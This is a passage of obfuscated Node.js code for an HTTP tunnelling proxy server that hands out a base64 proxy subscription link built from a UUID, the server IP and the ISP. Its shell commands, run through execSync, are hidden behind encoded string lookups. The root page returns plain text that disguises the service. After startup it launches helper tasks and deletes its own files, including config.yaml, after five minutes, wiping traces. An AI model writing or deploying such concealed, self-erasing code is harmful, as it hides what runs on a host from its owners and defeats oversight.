Error(_0x5a0cff(0x1bd));return new Promise((_0x14cc0d,_0x1fd8af)=>{const _0x505568=_0x5a0cff;this[_0x505568(0x207)][_0x505568(0x218)](_0x1def69,_0x2c0821=>{const _0x5b535a=_0x505568;_0x2c0821?(log(_0x5b535a(0x244),'Failed\x20to\x20write\x20to\x20remote:\x20'+_0x2c0821['message']),_0x1fd8af(_0x2c0821)):_0x14cc0d();});});}['_startDownstreamResponse'](){const _0x3feb0a=_0x75a68;if(!this[_0x3feb0a(0x1d5)]||!this['responseHeader'])return;try{!this[_0x3feb0a(0x188)]&&(this[_0x3feb0a(0x1d5)][_0x3feb0a(0x218)](this[_0x3feb0a(0x170)]),this['headerSent']=!![]),this[_0x3feb0a(0x207)]['pipe'](this['currentStreamRes']),this[_0x3feb0a(0x207)]['on'](_0x3feb0a(0x208),()=>{const _0x4b00bb=_0x3feb0a;!this[_0x4b00bb(0x1d5)][_0x4b00bb(0x169)]&&this[_0x4b00bb(0x1d5)][_0x4b00bb(0x208)]();}),this[_0x3feb0a(0x207)]['on']('error',_0x15be08=>{const _0x239496=_0x3feb0a;log(_0x239496(0x244),'Remote\x20error:\x20'+_0x15be08[_0x239496(0x1a2)]),!this[_0x239496(0x1d5)]['writableEnded']&&this[_0x239496(0x1d5)][_0x239496(0x208)]();});}catch(_0x970571){log(_0x3feb0a(0x244),_0x3feb0a(0x202)+_0x970571['message']),this[_0x3feb0a(0x1e8)]();}}[_0x75a68(0x1e8)](){const _0x4f1035=_0x75a68;!this['cleaned']&&(this['cleaned']=!![],log(_0x4f1035(0x18d),_0x4f1035(0x164)+this[_0x4f1035(0x184)]),this['remote']&&(this[_0x4f1035(0x207)][_0x4f1035(0x1e0)](),this[_0x4f1035(0x207)]=null),this[_0x4f1035(0x160)]=![],this[_0x4f1035(0x188)]=![]);}}const metaInfo=execSync(_0x75a68(0x1da),{'encoding':'utf-8'}),ISP=metaInfo[_0x75a68(0x1e1)]();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync(_0x75a68(0x1cd),{'encoding':_0x75a68(0x23c)})[_0x75a68(0x1e1)]();}catch(_0x3ce8a1){try{IP='['+execSync(_0x75a68(0x1a7),{'encoding':_0x75a68(0x23c)})[_0x75a68(0x1e1)]()+']';}catch(_0x2d7abe){log(_0x75a68(0x244),_0x75a68(0x1cf),_0x2d7abe[_0x75a68(0x1a2)]),IP=_0x75a68(0x245);}}const server=http[_0x75a68(0x1b1)]((_0x3b2042,_0x5e0ec5)=>{const _0x28b950=_0x75a68,_0x1a1813={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x28b950(0x1ee),'Cache-Control':_0x28b950(0x1cc),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x3b2042[_0x28b950(0x1b3)]==='/'){_0x5e0ec5[_0x28b950(0x1f7)](0xc8,{'Content-Type':'text/plain'}),_0x5e0ec5[_0x28b950(0x208)](_0x28b950(0x222));return;}if(_0x3b2042[_0x28b950(0x1b3)]==='/'+SUB_PATH){const _0x32ab25=_0x28b950(0x19d)+UUID+'@'+IP+_0x28b950(0x19b)+IP+_0x28b950(0x224)+IP+_0x28b950(0x180)+SETTINGS[_0x28b950(0x168)]+_0x28b950(0x1bc)+NAME+'-'+ISP,_0x4e651e=Buffer[_0x28b950(0x203)](_0x32ab25)['toString'](_0x28b950(0x235));_0x5e0ec5[_0x28b950(0x1f7)](0xc8,{'Content-Type':_0x28b950(0x1a9)}),_0x5e0ec5[_0x28b950(0x208)](_0x4e651e+'\x0a');return;}const _0x150265=_0x3b2042[_0x28b950(0x1b3)][_0x28b950(0x22f)](new RegExp(XPATH+_0x28b950(0x243)));if(!_0x150265){_0x5e0ec5['writeHead'](0x194),_0x5e0ec5[_0x28b950(0x208)]();return;}const _0x3be8de=_0x150265[0x1],_0x43791a=_0x150265[0x2]?parseInt(_0x150265[0x2]):null;if(_0x3b2042[_0x28b950(0x185)]===_0x28b950(0x1d8)&&!_0x43791a){_0x1a1813[_0x28b950(0x16e)]=_0x28b950(0x189),_0x1a1813[_0x28b950(0x176)]=_0x28b950(0x15f);let _0x3a0a73=sessions[_0x28b950(0x193)](_0x3be8de);!_0x3a0a73&&(_0x3a0a73=new Session(_0x3be8de),sessions[_0x28b950(0x1fc)](_0x3be8de,_0x3a0a73),log('info',_0x28b950(0x1d0)+_0x3be8de));_0x3a0a73['downstreamStarted']=!![];!_0x3a0a73[_0x28b950(0x221)](_0x5e0ec5,_0x1a1813)&&(log(_0x28b950(0x244),_0x28b950(0x1c1)+_0x3be8de),!_0x5e0ec5[_0x28b950(0x166)]&&(_0x5e0ec5[_0x28b950(0x1f7)](0x1f4),_0x5e0ec5['end']()),_0x3a0a73['cleanup'](),sessions['delete'](_0x3be8de));return;}if(_0x3b2042[_0x28b950(0x185)]===_0x28b950(0x17a)&&_0x43791a!==null){let _0x1bf127=sessions['get'](_0x3be8de);!_0x1bf127&&(_0x1bf127=new Session(_0x3be8de),sessions['set'](_0x3be8de,_0x1bf127),log(_0x28b950(0x17e),_0x28b950(0x20b)+_0x3be8de),setTimeout(()=>{const _0x936fcf=_0x28b950,_0x3a3310=sessions['get'](_0x3be8de);_0x3a3310&&!_0x3a3310[_0x936fcf(0x17f)]&&(log('warn',_0x936fcf(0x213)+_0x3be8de+_0x936fcf(0x187)),_0x3a3310['cleanup'](),sessions[_0x936fcf(0x237)](_0x3be8de));},SETTINGS[_0x28b950(0x1ad)]));let _0x3a2079=[],_0x452e90=0x0,_0x373f58=![];_0x3b2042['on']('data',_0x37aa42=>{const _0x24267f=_0x28b950;_0x452e90+=_0x37aa42[_0x24267f(0x18b)];if(_0x452e90>SETTINGS[_0x24267f(0x211)]){!_0x373f58&&(_0x5e0ec5[_0x24267f(0x1f7)](0x19d),_0x5e0ec5[_0x24267f(0x208)](),_0x373f58=!![]);return;}_0x3a2079[_0x24267f(0x1be)](_0x37aa42);}),_0x3b2042['on'](_0x28b950(0x208),async()=>{const _0x51a53e=_0x28b950;if(_0x373f58)return;try{const _0x3e8772=Buffer[_0x51a53e(0x182)](_0x3a2079);log(_0x51a53e(0x17e),'Processing\x20packet:\x20seq='+_0x43791a+',\x20size='+_0x3e8772[_0x51a53e(0x18b)]),await _0x1bf127[_0x51a53e(0x1d7)](_0x43791a,_0x3e8772),!_0x373f58&&(_0x5e0ec5['writeHead'](0xc8,_0x1a1813),_0x373f58=!![]),_0x5e0ec5[_0x51a53e(0x208)]();}catch(_0x361a50){log(_0x51a53e(0x244),'Failed\x20to\x20process\x20POST\x20request:\x20'+_0x361a50['message']),_0x1bf127['cleanup'](),sessions[_0x51a53e(0x237)](_0x3be8de),!_0x373f58&&(_0x5e0ec5[_0x51a53e(0x1f7)](0x1f4),_0x373f58=!![]),_0x5e0ec5[_0x51a53e(0x208)]();}});return;}_0x5e0ec5[_0x28b950(0x1f7)](0x194),_0x5e0ec5[_0x28b950(0x208)]();});server['on']('secureConnection',_0x415974=>{const _0x411080=_0x75a68;log(_0x411080(0x18d),_0x411080(0x1ea)+(_0x415974[_0x411080(0x1ae)]||'http/1.1'));});function generatePadding(_0x5adbca,_0x42031a){const _0x3e7465=_0x75a68,_0x1c4f47=_0x5adbca+Math[_0x3e7465(0x1a6)](Math[_0x3e7465(0x1eb)]()*(_0x42031a-_0x5adbca));return Buffer[_0x3e7465(0x203)](Array(_0x1c4f47)[_0x3e7465(0x22c)]('X')[_0x3e7465(0x17d)](''))[_0x3e7465(0x17c)](_0x3e7465(0x235));}server['keepAliveTimeout']=0x975e0,server['headersTimeout']=0x98968,server['on'](_0x75a68(0x244),_0x2721b9=>{log('error','Server\x20error:\x20'+_0x2721b9['message']);});const delFiles=()=>{const _0x4d73b4=_0x75a68;[_0x4d73b4(0x195),'config.yaml'][_0x4d73b4(0x1c4)](_0x3abbec=>fs[_0x4d73b4(0x1d4)](_0x3abbec,()=>{}));};server[_0x75a68(0x21e)](PORT,()=>{const _0x5a78e9=_0x75a68;runnz(),setTimeout(()=>{delFiles();},0x493e0),addAccessTask(),console[_0x5a78e9(0x16c)](_0x5a78e9(0x201)+PORT),log(_0x5a78e9(0x17e),_0x5a78e9(0x1f0)),log('info',_0x5a78e9(0x163)+SETTINGS[_0x5a78e9(0x1d9)]),log('info','Max\x20buffered\x20posts:\x20'+SETTINGS['MAX_BUFFERED_POSTS']),log(_0x5a78e9(0x17e),_0x5a78e9(0x18a)+SETTINGS[_0x5a78e9(0x211)]+'KB'),log(_0x5a78e9(0x17e),_0x5a78e9(0x246)+SETTINGS[_0x5a78e9(0x1b8)]+'KB'),log(_0x5a78e9(0x17e),'Session\x20timeout:\x20'+SETTINGS[_0x5a78e9(0x219)]+_0x5a78e9(0x181)),log('info',_0x5a78e9(0x1f0));});
